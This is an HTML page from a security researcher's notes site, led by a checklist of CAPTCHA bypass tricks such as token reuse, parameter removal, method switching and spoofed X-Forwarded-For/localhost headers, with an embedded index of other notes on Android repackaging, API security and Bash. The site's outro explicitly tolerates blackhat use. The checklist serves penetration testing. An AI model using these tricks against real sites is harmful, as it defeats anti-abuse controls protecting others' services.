<!DOCTYPE html>
<html><title>Captcha Bypass Tricks</title>


<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
/>
<meta name="apple-mobile-web-app-capable" content="yes" />


    


<link href="/favicon.png" rel="icon" type="image/x-icon" />


<link rel="stylesheet" href="/css/index.f49ab766d871bc00b33b82bbf2b48b28b0622bb79947d22492cf9b963b027189.css" />

<style type="text/css">
  :root {
    --color: #333;
    --background-color: #fafafa;
    --line-height: 1.4;
    --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";

    --header-background-color: #ffffff;
    --header-border-bottom-color: #ccc;
    --header-color: #000000;

    --page-background-color: #ffffff;
    --page-border-left-color: rgba(0, 0, 0, 0.05);
    --page-link-color: rgba(10, 132, 255, 1);
    --page-max-width: 625px;
    --page-font-size: 17px;
    --page-line-height: 24px;
    --page-hr-background-color: #dddddd;

    --backlinks-background-color: #fafafc;
    --backlinks-border-radius: 16px;
    --backlink-label-color: #888888;
    --backlink-title-color: #000000;
    --backlink-preview-color: rgb(102, 102, 102);
    --backlink-hover-background-color: rgba(0, 0, 0, 0.05);

    --preview-width: 625px;
    --preview-max-height: 400px;
    --preview-scale: 0.8;
    --preview-box-shadow-top-color: rgba(0, 0, 0, 0.08);
    --preview-box-shadow-right-color: rgba(0, 0, 0, 0.04);
    --preview-box-shadow-bottom-color: rgba(0, 0, 0, 0.15);
    --preview-box-shadow-left-color: rgba(0, 0, 0, 0.04);

    --search-extract-color: #aaaaaa;
  }

 .menu-item-position {
    font-size: 14px;
    display: inline;
    margin: 0 5px 0 0;
}

.menu-item {
    margin: 0 0 10px 0;
    font-weight: bold;
}
.menu-item {
    font-size: 100%;
}

#head {
    margin-left: 15px;
    font-family: "Courier New";
    font: 14px 'Courier New';
     
}

#wrap {
    width: 550px;
    margin: 10px;
}

body {
    background: #fff;
     
}

.title-coded {
    font-size: 12px;
}
</style>


<body><style type="text/css">
    .menu-item-position > a {
        padding-right: 10px;
        padding-left: 10px;
    }
</style>
<header>
    <a href="/" id="logo-and-title">
    
    <div class="site-logo">
       <img class="site-logo" src="/favicon.png" />
    </div>
        </a>

        <div id="head">
            <h1 class="menu-item menu-item-position"><a style="padding-left: 0px;" class="author" href="https://duraki.github.io/">halis duraki</a></h1> /
            <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/reports.html">security rep+</a></h1> / 
            <h1 class="menu-item menu-item-position"><a class="author" href="https://durakiconsulting.com/">consulting</a></h1> / 
            <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/">blog</a> </h1> /
            <h1 class="menu-item menu-item-position"><a class="author" href="/">~ notes</a></h1> <br /> 
        </div><form id="search"
    action='/search/' method="get">
    <label hidden for="search-input">Search site</label>
    <input type="text" id="search-input" name="query"
    placeholder="search in ~notes" value="">
    <input id="search-submit" type="submit" value="search">
</form>
<div style="display: flex; text-align: right; margin-left: 10px;"><a style="text-decoration: none !important;" href="https://twitter.com/0xduraki"><code style="color: #93939369;"> - 0xduraki</code></a></p>
</header>

<div class="grid-container">
  <div class="grid">
    <div class="page" data-level="2">
      <div class="content">
        <h1>Captcha Bypass Tricks</h1>
        <p><strong>Header Injection to bypoass Captcha</strong></p>
<pre tabindex="0"><code>1. Response manipulation.
2. Use previously used token.
3. Use any token with same length(+1/-1).
4. Remove the param value or remove the entire parameter.
5. Change method from POST to GET(or PUT) and remove the captcha.
6. Change body to JSON or vice-versa.
7. OCR.
8. Check whether the captcha is in the source code. (Ex: 2+2)
9. Check whether the value of the captcha is in the source code.
10. Use the same captcha value with the different sessionIDs.
11. JSON Body? Combine 6 and 5.
12. Add headers:
        X-Forwarded-Host: 127.0.0.1
        X-Forwarded-For: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        X-Client-IP: 127.0.0.1
        X-Host: 127.0.0.1
</code></pre>
      </div>
      





   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   




      </div>
   </div>
</div>

<script src="/js/URI.js" type="text/javascript"></script>

<script src="/js/page.js" type="text/javascript"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
<script>
window.store = {
    
    
    
    
    "\/": {
        
        "title": "duraki notes",
        "tags": [],
        "content": "About these notes Hi! üëã I\u0026rsquo;m Halis Duraki and these are my personal notes. I\u0026rsquo;m a passionate hacker, mostly interested in reverse engineering, 0day exploitation and web applications. Notes presented here will relate to topics I\u0026rsquo;m most expertus about.\nI started using Obsidian a bit early in 2020. and continued graphing my knowledge since then. I wanted something more functional, as to offer me a practical snippet library for my TTP\u0026rsquo;s, both online and as a backup of my dementia.\nThe notes are inspired by others, and I\u0026rsquo;m very thankful for all the ideas. To simply put, I use this to note-take, graph, and quickly extract valuable data.\nI sincerly hope these notes will help you build yourself, extend your views, and expand your possibilities. In any case, these notes were written for myself and by myself, so they might not reflect the wide public opinion, nor was that the case when I started collecting them.\nYou can start exploring from the List of Topics, or see the full list of notes.\nList of Topics Automotive Cyber Security Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment BMW E34 Learning Material Electronic Signals AC \u0026amp; DC Signals (‚è¶Ô∏é click here to expand) AC Voltage Signals DC Voltage Signals Signals Table Classical Penetration Testing OSINT Web Pentest Oneliners Web Fuzzing Javascript Deobfuscation SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists REST API Issue Library Web Issue Library PHP Source Code Analysis PHP Filesystem Functions Networking ¬ßNetwork Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks Reverse Engineering Tricks and Tips Network Reverse Engineering WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts Encryption and Cryptography Demangling C++ files using Frida Frida Frida Class Generator Frida and r2 Interop radare2 MacOS Reverse Engineering Ghidra MacOS Library Injection LLDB for MacOS Hopper for MacOS MacOS MITM for TCP/UDP protocols macOS ARM/M1/M2 ARM/M1/M2 ¬ß M1 LLDB Configuration Using Frida against MachO on ARM iOS Reverse Engineering Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB for iOS iOS Library Injection Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis Frida Gadget injection on iOS Advanced Frida Scripting for iOS Frida Tracing Android Reverse Engineering Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation OPCRouter Research Development .files\nMy .dotfiles are available on my GitHub. At the time of writing, this repository is private due to confidential information.\nIn particular, I use:\nssh, git, iterm, zsh, tmux macos, neovim+nvchad, karabiner, 60%mkb, lldb+voltron, amass, binwalk, nmap, burp blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\ntodo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash btw, I use GMMK 60% keyboard, here are the default shortcuts.\nMisc Windows Notes Linux Notes MacOS Notes Single-Board Computers (SBC) Raspberry Pi Installation Enable SSH access via SD Card Building Kali Linux for Banana Pro Mounting SD Cards Mounting (ext4) partition in MacOS Uplink (game) Modding How to write Notes Troubleshoot ~ ideas How it works It uses parameters (such is [params.styles]) via config.toml. It\u0026rsquo;s possible to deploy dark version as well. Read for more in *.css. The theme used in ~notes is rewritten from my blog.\nOutro Show #Outro This website is provided free, for educational purposes. Knowledge shared here can be used for personal gain and experience. I do not condemn using TTPs explained here in your blackhat activities. The site is largely inspired by Andy\u0026rsquo;s notes. Thanks to Justin and Jethro for their theme support and contribution. I would like to thank to the One, All-seeing, All-hearing. Many greetings to all my friends and family who supported me till the very end.\nPeace out ‚úåÔ∏è\n", 
        "url": "\/"
    },
    
    
    
    "\/search\/": {
        
        "title": "Search",
        "tags": [],
        "content": "", 
        "url": "\/search\/"
    },
    
    
    
    "\/debug\/dbg\/": {
        
        "title": "[debug] @ duraki notes",
        "tags": [],
        "content": " {{/* partial \u0026quot;debugprint.html\u0026quot; site */}} {{/* partial \u0026quot;debugprint.html\u0026quot; site.Menus */}} {{/* partial \u0026quot;debugprint.html\u0026quot; .GitInfo */}} {{/* partial \u0026quot;debugprint.html\u0026quot; .Resources */}} {{/* partial \u0026quot;debugprint.html\u0026quot; .File */}} {{/* partial \u0026quot;console_log\u0026quot; ( $re ) */}} # =\u0026gt; logs to browser console; only when called from themes/*/ dir {{/*\u0026lt; debug var=\u0026quot;2\u0026quot; \u0026gt;}} {{/*\u0026lt; debug param=\u0026quot;myParam\u0026quot; var=\u0026quot;1\u0026quot; \u0026gt;}} {{/*\u0026lt; debug param=\u0026quot;.site.baseURL\u0026quot; \u0026gt;}} {{/*\u0026lt; debug \u0026gt;}} {{/*\u0026lt; debug site \u0026gt;}} ", 
        "url": "\/debug\/dbg\/"
    },
    
    
    
    "\/~-ideas\/": {
        
        "title": "~ ideas",
        "tags": [],
        "content": " SonicWall SMA100 Firmware 1day OPC Router DLL Hijacking, XML Attack via Licenses Make extension for Burp which can highlight any part of the Repeater/Intruder/ Proxy/Dec0der. A flow would is similar to: (1) selecting the appropriate text you wish to highlight; (2) rm click and select Highlight -\u0026gt; Favorited (color) from the Menu items. This came to me as an idea during the 36 hours grayhat sprint (day+night) which collected more then 40k requests. It would look similar to what Decoder currently looks like, albeit more colerful: Another extension which would be appreciated for PortSwiger\u0026rsquo;s toolset is a Request/Response Header Tree implementation. User is able to \u0026ldquo;collapse\u0026rdquo; or \u0026ldquo;expand\u0026rdquo; Header keys in some views, or all of them, while editing or viewing message. It will show +/-~what you see on inspector, although more tidy. It would look similar to this: ", 
        "url": "\/~-ideas\/"
    },
    
    
    
    "\/ac-and-dc-signals\/": {
        
        "title": "AC and DC Signals",
        "tags": [],
        "content": "This is part of BMW E34 Learning Resources, Topics related to Signals. See Learning Resource index page and Electronic Signals for more details.\nThere are two types of such signals in BMW factory/production process:\nAC Type Signals, induced by shifting of a magnetic field, DC Type Signals, induced via multiple types of signals and sensors (Analog, Digital, Coded et al.). AC Type Signals - Frame View DC Type Signals - Frame View ", 
        "url": "\/ac-and-dc-signals\/"
    },
    
    
    
    "\/ac-voltage-signals\/": {
        
        "title": "AC Voltage Signals",
        "tags": [],
        "content": "Inductive Signals (Induced Voltage) Inductive sensors produce an AC Sine Wave (see below) signal. The AC voltage is induced by the shifting of a magnetic field. The sensor consists of an impulse wheel (the moving part), and a coil wound magnetic core (stationary part). As each \u0026ldquo;tooth\u0026rdquo; (spike) of the impulse wheel approaches the sensor tip, the magnetic field of the sensor shifts toward the impulse wheel and induces a voltage pulse in the windings.\nAs the teeth move away from the sensor, the magnetic field shifts back inducing a voltage pulse in the opposite direction.\nThis shifting of the magnetic field produces an alternating current (Positive to Negative).\nControl Module(s) which receive this alternating current, count the impulses (count shifts from positive to negative), and interpret the speed of rotation of the impulse wheel.\nGraphical Flow Diagram of AC Voltage Signal Read More Note: Voltage levels are dependent on sensor design. Not all inductive sensors produce 12 Volts. AC Voltage Sine Wave AC Type Signals ", 
        "url": "\/ac-voltage-signals\/"
    },
    
    
    
    "\/android-recompilation\/": {
        
        "title": "Android Recompilation",
        "tags": [],
        "content": "Decompile Android APK file using apktool:\n# =\u0026gt; decompile $ apktool -r d AppName.apk -o AppName # =\u0026gt; recompile $ apktool b AppName Resign the APK package and install the Android application:\n# =\u0026gt; sign the apk package $ keytool -genkey -keystore example.keystore -validity 10000 -alias example $ jarsigner -keystore example.keystore -verbose AppName.apk example # =\u0026gt; installation $ apk install AppName.apk ", 
        "url": "\/android-recompilation\/"
    },
    
    
    
    "\/android-reverse-engineering\/": {
        
        "title": "Android Reverse Engineering",
        "tags": [],
        "content": "Burp Proxy Setup If using Android 7 or above, you need to export Burp CA Certificate from Proxy ‚Üí Options, and selecting Import/Export CA certificate. Android wants the certificate to be in PEM format. The filename has to be equal to the subject_hash_old value appended with .0.\nNote - if you are using OpenSSL \u0026lt; 1.0, you need to use subject_hash instead of subject_hash_old.\nUsing openssl is recommended way to convert DER to PEM format. Dump the subject_hash_old and rename the file as explained above.\n$ openssl x509 -inform DER -in cacert.der -out cacert.pem $ openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1 $ mv cacert.pem \u0026lt;hash\u0026gt;.0 Push the certificate onto Android device by using adb or ssh:\n# =\u0026gt; move cert to the device $ adb push \u0026lt;hash\u0026gt;.0 /data/local/tmp # =\u0026gt; on android device: $ adb shell % su % mount -o rw,remount /system % mv /data/local/tmp/\u0026lt;hash\u0026gt;.0 /system/etc/security/cacerts/ % chown root:root /system/etc/security/cacerts/\u0026lt;hash\u0026gt;.0 % chmod 644 /system/etc/security/cacerts/\u0026lt;hash\u0026gt;.0 % reboot Using Logcat on Android To use built-in logcat, append the following:\n$ adb shell \u0026#39;logcat --pid=$(pidof -s x.xxx.xxx.xxxxx.xx)\u0026#39; Toolset jnitrace - trace JNI API in Android apps ldpreloadhook - open/close/ioctl/read/write/free symbol hooker dexinfo - android dex file parser dexterity - analyse and manipulate android dex files apk-medit - memory search and patch tool for non-rooted android devices ApkUrlGrep - extract endpoints from APK files dexcalibur - frida powered android RE tool fridroid-unpacker - defeat Java packers via Frida instrumentation References\nAndroid Nougat and Burp Proxy Configuration Install custom CA on Android Generic Android Deobfuscator Injecting Frida via Lief Frida on non-rooted device InjectFridaGadget tool Proxying Android App traffic ", 
        "url": "\/android-reverse-engineering\/"
    },
    
    
    
    "\/api-penetration-test-checklist\/": {
        
        "title": "API Penetration Test Checklist",
        "tags": [],
        "content": "--- ## Authentication - [ ] Don\u0026#39;t use `Basic Auth`. Use standard authentication instead (e.g. [JWT](https://jwt.io/), [OAuth](https://oauth.net/)). - [ ] Don\u0026#39;t reinvent the wheel in `Authentication`, `token generation`, `password storage`. Use the standards. - [ ] Use `Max Retry` and jail features in Login. - [ ] Use encryption on all sensitive data. ### JWT (JSON Web Token) - [ ] Use a random complicated key (`JWT Secret`) to make brute forcing the token very hard. - [ ] Don\u0026#39;t extract the algorithm from the header. Force the algorithm in the backend (`HS256` or `RS256`). - [ ] Make token expiration (`TTL`, `RTTL`) as short as possible. - [ ] Don\u0026#39;t store sensitive data in the JWT payload, it can be decoded [easily](https://jwt.io/#debugger-io). ### OAuth - [ ] Always validate `redirect_uri` server-side to allow only whitelisted URLs. - [ ] Always try to exchange for code and not tokens (don\u0026#39;t allow `response_type=token`). - [ ] Use `state` parameter with a random hash to prevent CSRF on the OAuth authentication process. - [ ] Define the default scope, and validate scope parameters for each application. ## Access - [ ] Limit requests (Throttling) to avoid DDoS / brute-force attacks. - [ ] Use HTTPS on server side to avoid MITM (Man in the Middle Attack). - [ ] Use `HSTS` header with SSL to avoid SSL Strip attack. - [ ] For private APIs, only allow access from whitelisted IPs/hosts. ## Input - [ ] Use the proper HTTP method according to the operation: `GET (read)`, `POST (create)`, `PUT/PATCH (replace/update)`, and `DELETE (to delete a record)`, and respond with `405 Method Not Allowed` if the requested method isn\u0026#39;t appropriate for the requested resource. - [ ] Validate `content-type` on request Accept header (Content Negotiation) to allow only your supported format (e.g. `application/xml`, `application/json`, etc.) and respond with `406 Not Acceptable` response if not matched. - [ ] Validate `content-type` of posted data as you accept (e.g. `application/x-www-form-urlencoded`, `multipart/form-data`, `application/json`, etc.). - [ ] Validate user input to avoid common vulnerabilities (e.g. `XSS`, `SQL-Injection`, `Remote Code Execution`, etc.). - [ ] Don\u0026#39;t use any sensitive data (`credentials`, `Passwords`, `security tokens`, or `API keys`) in the URL, but use standard Authorization header. - [ ] Use an API Gateway service to enable caching, Rate Limit policies (e.g. `Quota`, `Spike Arrest`, or `Concurrent Rate Limit`) and deploy APIs resources dynamically. ## Processing - [ ] Check if all the endpoints are protected behind authentication to avoid broken authentication process. - [ ] User own resource ID should be avoided. Use `/me/orders` instead of `/user/654321/orders`. - [ ] Don\u0026#39;t auto-increment IDs. Use `UUID` instead. - [ ] If you are parsing XML files, make sure entity parsing is not enabled to avoid `XXE` (XML external entity attack). - [ ] If you are parsing XML files, make sure entity expansion is not enabled to avoid `Billion Laughs/XML bomb` via exponential entity expansion attack. - [ ] Use a CDN for file uploads. - [ ] If you are dealing with huge amount of data, use Workers and Queues to process as much as possible in background and return response fast to avoid HTTP Blocking. - [ ] Do not forget to turn the DEBUG mode OFF. ## Output - [ ] Send `X-Content-Type-Options: nosniff` header. - [ ] Send `X-Frame-Options: deny` header. - [ ] Send `Content-Security-Policy: default-src \u0026#39;none\u0026#39;` header. - [ ] Remove fingerprinting headers - `X-Powered-By`, `Server`, `X-AspNet-Version`, etc. - [ ] Force `content-type` for your response. If you return `application/json`, then your `content-type` response is `application/json`. - [ ] Don\u0026#39;t return sensitive data like `credentials`, `Passwords`, or `security tokens`. - [ ] Return the proper status code according to the operation completed. (e.g. `200 OK`, `400 Bad Request`, `401 Unauthorized`, `405 Method Not Allowed`, etc.). ## CI \u0026amp; CD - [ ] Audit your design and implementation with unit/integration tests coverage. - [ ] Use a code review process and disregard self-approval. - [ ] Ensure that all components of your services are statically scanned by AV software before pushing to production, including vendor libraries and other dependencies. - [ ] Design a rollback solution for deployments. --- ## See also: - [yosriady/api-development-tools](https://github.com/yosriady/api-development-tools) - A collection of useful resources for building RESTful HTTP+JSON APIs. ", 
        "url": "\/api-penetration-test-checklist\/"
    },
    
    
    
    "\/armbian\/": {
        
        "title": "Armbian",
        "tags": [],
        "content": "Headless Wireless Configuration If you want to set up a Wi-Fi Network, and perhaps an SSH server for a freshly-installed Armbian on the SD Card, this is the right place to look at. Sometimes, it can happen that you don\u0026rsquo;t have access to the Monitor/Display and/or physical Keyboard. This notes describes how to configure Wi-Fi connection without having such hardware.\nAfter etching the Armbian Operating System image *.img.xz on SD Card, start mounting ext4 partition using fuse-ext2. This FUSE software will allow you to read/write on the ext4 partition of the SD Card, from the Host Machine (ie. MacOS). In short:\n$ sudo diskutil unmountDisk /dev/disk[N] $ sudo mkdir /Volumes/armbian $ sudo fuse-ext2 /dev/disk2s1 /Volumes/armbian -o rw+ We are interested in boot/ directory of our /Volumes/armbian mount point. Copy the file boot/armbian_first_run.txt.template to boot/armbian_first_run.txt in your ext4 partition mount point. This is a special Armbian configuration file that gets executed only on the first boot; meaning the settings in the configuration will be applied only once, when the Armbian is booted for a first time.\n$ mv /Volumes/armbian/boot/armbian_first_run.txt.template /Volumes/armbian/boot/armbian_first_run.txt # =\u0026gt; edit \u0026#39;armbian_first_run.txt\u0026#39; accordingly FR_general_delete_this_file_after_completion=1 #Networking: FR_net_change_defaults=1 FR_net_wifi_enabled=1 FR_net_ethernet_enabled=1 FR_net_wifi_ssid=\u0026#39;*********************\u0026#39; FR_net_wifi_key=\u0026#39;************\u0026#39; FR_net_wifi_countrycode=\u0026#39;BA\u0026#39; # =\u0026gt; via https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2 You can read more details about these keys and configuration settings, from the official armbian/build repository.\nThis Armbian First Run configuration will do the following:\nChange network interface to enable Wi-Fi Set Wi-Fi SSID and Password to which to connect on the first boot (Hardcoded) Set Wi-Fi frequency and prefered channel based on the Country When you complete all necessary steps described above, you can now unmount the ext4 partition, and boot into the SBC (ie. Raspberry Pi).\n$ cd # =\u0026gt; important, goes to $HOME directory, and does not block /dev/disk[N]s resource $ sudo umount /Volumes/armbian Eject and remove the SD Card from your Host machine, and put it in the SBC (Raspberry Pi, Banana Pro et al.). Before powering up the SBC, take a note of all IPv4 assigned on the gateway/router. This way, you can conclude which devices were already allocated to gateway, and what is the newly created device in the network.\n# =\u0026gt; from the Host OS $ arp -a -n ? (192.168.0.28) at xxxxxxxxxxxxxxxxx on en0 ifscope permanent [ethernet] ? (192.168.0.29) at xxxxxxxxxxxxxxxxx on en0 ifscope [ethernet] ? (192.168.0.32) at xxxxxxxxxxxxxxxxx on en0 ifscope [ethernet] ? (192.168.0.90) at xxxxxxxxxxxxxxxxx on en0 ifscope [ethernet] Power and Boot up your SBC, in my case, a Banana Pro w/ ARM context. Wait around ~5 minutes or so for a Operating System to boot up. In the meantime, you can continuesly ping the defined static IPv4 of the Armbian OS, and also dump Address Resolution Network again, to see if the new device has been added in the list.\n$ arp -a -n ... ? (192.168.0.38) at xxxxxxxxxxxxxxxxx on en0 ifscope [ethernet] Ah-ha! There it is.\n", 
        "url": "\/armbian\/"
    },
    
    
    
    "\/automotive-cybersecurity-videos\/": {
        
        "title": "Automotive Cybersecurity Videos",
        "tags": [],
        "content": "https://www.youtube.com/watch?v=xHfInsMEYdQ https://www.youtube.com/watch?v=DUNWZnhneiI https://www.youtube.com/watch?v=mz55tsLnlSc https://www.youtube.com/watch?v=k50hU6aPlG8 https://www.youtube.com/watch?v=k4JD2ZUHrXA - Cert-based auth via UDS https://www.youtube.com/watch?v=KqV5nIkGKFs - CANFD explained https://www.youtube.com/watch?v=XMVLkbw1BNE - New Standard for Ethernet on a Bus Line (10BASE-T1S) https://www.youtube.com/watch?v=WW481idfcro - Cert-based auth via Vector tool https://www.youtube.com/watch?v=pxlx3_gEiFM - Embedded Security in Automotive https://www.youtube.com/watch?v=3uU0Sl-byVc - Using ML to detect anomalyes https://www.youtube.com/watch?v=QEOWjEytb6Y - Cert-based in diagnostics (in-depth) https://www.youtube.com/watch?v=bUdxpsQXeRU - Corporate security testing in Automotive https://www.youtube.com/watch?v=DuXhz4mDYZA - From TARA to Pentest https://www.youtube.com/watch?v=7D7uNqPWrXw - Using Scapy for Car pentesting\nhwio\nhttps://www.youtube.com/watch?v=2fplLJ3S3d0 https://www.youtube.com/watch?v=Myp4-RsdE-Y https://www.youtube.com/watch?v=Hzazchbvu6M https://www.youtube.com/watch?v=dZVWXP2j0co https://www.youtube.com/watch?v=10Dag6ee2d8\nudemy/can interface https://deloittedevelopment.udemy.com/course/master-can-protocol-completely-from-scratch/learn/\nProvided by Aron S.\ncheck these out to see how the UI looks. They have their own scripting language called CAPL:\nhttps://www.youtube.com/watch?v=uffjocL9Zt8 https://www.youtube.com/watch?v=KbVPeI9A_ME\n", 
        "url": "\/automotive-cybersecurity-videos\/"
    },
    
    
    
    "\/automotive-hacking\/": {
        
        "title": "Automotive Hacking",
        "tags": [],
        "content": " Link ECUs to avoid wires (weight, size, cost) Network Protocols allow ECUs to share information quickly and precisely (Ethernet \u0026amp; CANFD/CAN) Networks used between ECUs are based on Serial Communications Serial means that items of information are sent via a single stream of communication Speed of communication is measured in number of bits sent per second (bps) CAN (Controller Area Network) bus was developed to meet needs of up to 1 million bits per second (1Mbps) LIN (Local Interconnect Network) introduced to give a lower cost, lower speed altenative (~20 kbps) FlexRay was developed for more fault-tolerant, higher speed (10Mbps) network Ethernet (100Mbps) for videos and advanced driver assistance systems (new vehicles) Special ECU are used called \u0026ldquo;gateways\u0026rdquo; to interconnect different network protocols (CAN + LIN, or Ethernet + FlexRay etc.)\nVehicle Diagnostics ECUs provide diangostis services OBD standardises requests and responses related to diagnostics ISO 14229-1 (UDS) Standard Defines structures and content of how data is interpreted Read Fault Memory in the form of Diagnostic Trouble Codes from the ECU (detect faults) ", 
        "url": "\/automotive-hacking\/"
    },
    
    
    
    "\/banana-pro-quick-guide\/": {
        
        "title": "Banana Pro Quick Guide",
        "tags": [],
        "content": "todo\n", 
        "url": "\/banana-pro-quick-guide\/"
    },
    
    
    
    "\/bash-in-simple-words\/": {
        
        "title": "Bash in simple words",
        "tags": [],
        "content": "Although in some cases it\u0026rsquo;s better to use a systems language like C or Go, Bash is an ideal systems language for smaller POSIX-oriented tools or command line tasks. Why you may ask?\nIt\u0026rsquo;s everywhere. No, really .. it is. It\u0026rsquo;s easy. Everyone can learn it. It\u0026rsquo;s ready for interop. Write complex parts in C, use them in Bash. Bash scripting\nThe first two statements of your Bash script should always be:\n#!/usr/bin/env bash set -euo pipefail The first statement is a Unix/Linux portable way of finding the location of the bash interpreter. The second statement combines:\nset -e - ensures that your script stops on first command failure set -u - ensures that your script exits on the first unset variable encountered set -o pipefail - ensures that failed piped commands is also exit status Bash Rules\nAlways double quote variables, including subshells. No naked $ signs All code goes in a functions, yes, even main, just remeber to call it Avoid global variables in the script Always call the main function via main \u0026quot;$@\u0026quot; Always use local when setting a variable Variables should be lowercased, except when exported to environment Always use set -eo pipefail; early exits on failures, exit codes awareness Force exit code non-zero with || true, in case needed Function are defined as myFunc() { .. }, not function myFunc() { ... } Use [[ instead of [ or test Never use backticks to execute command, instead use $( ... ) Prefer absolute paths \u0026ndash; ie. $PWD, combined with relative path ./SomeFile.txt Use declare and name variable arguments at the top of the function declare arg1=\u0026quot;$1\u0026quot; arg2=\u0026quot;$2\u0026quot; Use mktemp for temporary files, make sure¬†to clean them up with trap Warnings and erros go to $stderr, and anything else to $stdout Bash Tips\nUse Bash variable substituion, before leveraging awk/sed/? Generally use double quotes, unless when single quotes are needed Use \u0026amp;\u0026amp; and || for conditionals Use printf instead of echo In if/do/?-expressions, put then, do on the same line Skip [[ ... ]] if you can test for exit code instead Use .sh or¬†.bash extension if file is meant to be included, but never on the executable script Complex one-lines such is sed, ruby, awk goes into its own function with descriptive name Good idea to include [[ \u0026quot;$TRACE\u0026quot; ]] \u0026amp;\u0026amp; set -x Use subcommands for necessary different \u0026ldquo;modes\u0026rdquo; If possible, define a method description at the top of the function¬†declare desc=\u0026quot;description\u0026quot; If you added desc declaration, you can query it using reflection eval $(type FUNCTION_NAME | grep 'declare desc=') \u0026amp;\u0026amp; echo \u0026quot;$desc\u0026quot; Use hard tabs, heredocs ignore leading tabs, allowing better indentation Examples\nRegular function with named arguments:\nregular_func() { declare arg1=\u0026#34;$1\u0026#34; arg2=\u0026#34;$2\u0026#34; arg3=\u0026#34;$3\u0026#34; # ... } Variadic functions:\nvariadic_func() { local arg1=\u0026#34;$1\u0026#34;; shift local arg2=\u0026#34;$1\u0026#34;; shift local rest=\u0026#34;$@\u0026#34; # ... } Conditionals:\n# Test for exit code (-q mutes output) if grep -q \u0026#39;foo\u0026#39; somefile; then ... fi # ... or ... # Test for output (-m1 limits to one result) if [[ \u0026#34;$(grep -m1 \u0026#39;foo\u0026#39; somefile)\u0026#34; ]]; then ... fi Bash Boilerplate:\n# Author: Halis Duraki \u0026lt;h@durakiconsulting.com\u0026gt; # License: durakiconsulting (c) \u0026lt;year\u0026gt; all rights reserved # Usage: # $ shexc #!/bin/sh set -euo pipefail log() { printf \u0026#39;\\033[32m-\u0026gt;\\033[m %s\\n\u0026#39; \u0026#34;$*\u0026#34; } die() { log \u0026#34;$*\u0026#34; \u0026gt;\u0026amp;2 exit 1 } usage() { echo \u0026#34;${0##*/} ARGS desc \u0026#34; exit 0 } main() { usage() } main \u0026#34;$@\u0026#34; Reference\nBash Hackers and common pitfalls bash-snippets Interactive Bash Google\u0026rsquo;s Bash styleguide shellcheck to lint and detect erros ", 
        "url": "\/bash-in-simple-words\/"
    },
    
    
    
    "\/blog-setup\/": {
        
        "title": "Blog Setup",
        "tags": [],
        "content": "The blog is using a custom site generator called art and it uses Ruby and some wrapper magic to generate this from a rather minimal configuration setup in .home.yml file.\n--- minimal: artist: \u0026#34;Your Name\u0026#34; title: \u0026#34;Blog Title\u0026#34; description: \u0026#34;Blog description.\u0026#34; theme: \u0026#34;theme-name\u0026#34; posts: in: /posts/in # =\u0026gt; post in (md) out: /posts/out # =\u0026gt; post out (html) scripts: - \u0026#34;my super href:/about/me.html\u0026#34; # =\u0026gt; Links/URIs/Other art: ga: UA-00000000-X # =\u0026gt; your Google Analytics ", 
        "url": "\/blog-setup\/"
    },
    
    
    
    "\/bmw-acronyms\/": {
        
        "title": "BMW Acronyms",
        "tags": [],
        "content": " Acronym Description A Processed Vehicle Speed AB Airbag ABS Anti-lock Braking System ADS Engine Intake Air Control ADV Wiper Pressure Control ASC All Season Traction BC Board Computer BLS Brake Light Switch BS Block Diagram BST Battery Safety Termina CANBUS Controller Area Network(bus) CCM Check Control Module DBUS Diagnosis Bus (same as TXD) DDE Digital Diesel Electronics DIS Diagnosis and Information System DISA Differential Air Intake Control DME Digital Motor Electronics DTC Diagnostic Trouble Code DWA Theft Deterrent System DWS Tire Pressure Warning System ECM Engine control module (SAE) EDC Electronic Dampening Contro EDK Electronic Throttle Valve EGS Electronic Transmission Control EH Electronic Hydraulic EHC Electronic Height Control EKM Electronic Body Module EKP Electronic Fuel Pump ELV Electronic Steering Lock EM Electro-Mechanical EMF Electro-Mechanical Emergency Brake EO Component Location EPC Electronic Parts Catalog ETM Electronic Troubleshooting Manual FB Function Description FFB Radio Remote Control FRU Flat Rate Unit GAL Speed Dependent Volume GM General Module HR34 Heading Control 34 (Dig/Analog) IB Interior lighting Control Signal IBUS Information Bus IHKA Automatic Heating and A/C IHKR Regulated Heating and A/C IHKR1 Regulated Heating and A/C Control 1 IHKR2 Regulated Heating and A/C Control 2 IHKR3 Regulated Heating and A/C Control 3 IHKS Standard Heating and A/C IKE Instrument Cluster Electronics IR Infrared ISIS Intelligent Safety Integration System ISN Individual Serial Number KAT Catalytic Converter KATON Converter Heating (signal) KBUS Body Bus KL Terminal Designation KO Compressor 